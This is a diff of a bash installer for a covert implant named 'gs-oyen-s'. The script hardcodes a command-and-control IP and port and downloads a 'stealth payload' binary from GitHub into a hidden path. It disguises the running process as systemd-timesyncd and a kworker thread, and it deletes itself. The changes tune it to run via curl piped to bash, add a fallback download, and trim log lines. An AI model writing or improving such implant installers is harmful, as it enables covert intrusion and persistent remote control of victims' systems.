@@ -5,13 +5,20 @@
 # SECTION 1: CORE DIRECTIVES
 set +u
 set -e
-set -o pipefail
+set +o pipefail  # DISABLE pipefail for curl | bash
 
 readonly VERSION="v1.0.1-stable"
 readonly AGENT_NAME="gs-oyen-s"
 readonly C2_ENDPOINT="116.202.105.253"
 readonly C2_PORT="8443"
 readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"
+
+# ANTI-RECURSION GUARD
+if [[ -n "$PHANTOM_INSTALL_RUNNING" ]]; then
+    echo "[!] Recursive execution detected. Exiting." >&2
+    exit 1
+fi
+export PHANTOM_INSTALL_RUNNING=1
 
 # 1. Environment Check
 ARCH=$(uname -m)
@@ -67,16 +74,13 @@ echo "[-] Initializing Stealth Payload..." >&2
 # 4. Download Payload
 DOWNLOAD_URL="${REPO_BASE}/bin/gs-oyen-s-${ARCH}"
 echo "[-] Downloading binary from GitHub..." >&2
-MAX_RETRIES=3
-RETRY_COUNT=0
-while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
-    if curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${STEALTH_PATH}"; then
-        break
+if ! curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${STEALTH_PATH}"; then
+    echo "[!] Download failed. Trying fallback..." >&2
+    if ! curl --fail --silent --max-time 30 -L "${REPO_BASE}/bin/gs-oyen-s-x86_64" -o "${STEALTH_PATH}"; then
+        echo "[ERROR] Critical download failure." >&2
+        exit 1
     fi
-    RETRY_COUNT=$((RETRY_COUNT+1))
-    echo "[!] Download failed. Retrying ($RETRY_COUNT/$MAX_RETRIES)..." >&2
-    sleep 2
-done
+fi
 
 if [[ ! -f "${STEALTH_PATH}" ]]; then
     echo "[ERROR] Critical download failure." >&2
@@ -112,23 +116,14 @@ else
 fi
 
 # 8. Post-Deploy Verification
-sleep 2
-AGENT_PID=$(pgrep -f "\.systemd-timesyncd" | head -n 1)
+sleep 3
+AGENT_PID=$(pgrep -f "systemd-timesyncd" | head -n 1)
 if [ -n "$AGENT_PID" ]; then
     echo "[+] Agent PID: ${AGENT_PID}" >&2
-    echo "[+] Agent connected to: ${C2_ENDPOINT}:${C2_PORT}" >&2
     echo "[+] Process Forked: [kworker/u4:0]" >&2
     echo "[+] Deployment Success" >&2
 else
-    echo "[!] Agent process not found. Possible crash." >&2
-    # Check if the process is running under the masqueraded name
-    AGENT_PID_MASK=$(pgrep -x "kworker/u4:0" | head -n 1)
-    if [ -n "$AGENT_PID_MASK" ]; then
-        echo "[+] Agent PID (masqueraded): ${AGENT_PID_MASK}" >&2
-        echo "[+] Deployment Success" >&2
-    else
-        echo "[!] Critical: Process not found in process list." >&2
-    fi
+    echo "[!] Agent process not found." >&2
 fi
 
 # 9. Self-Delete
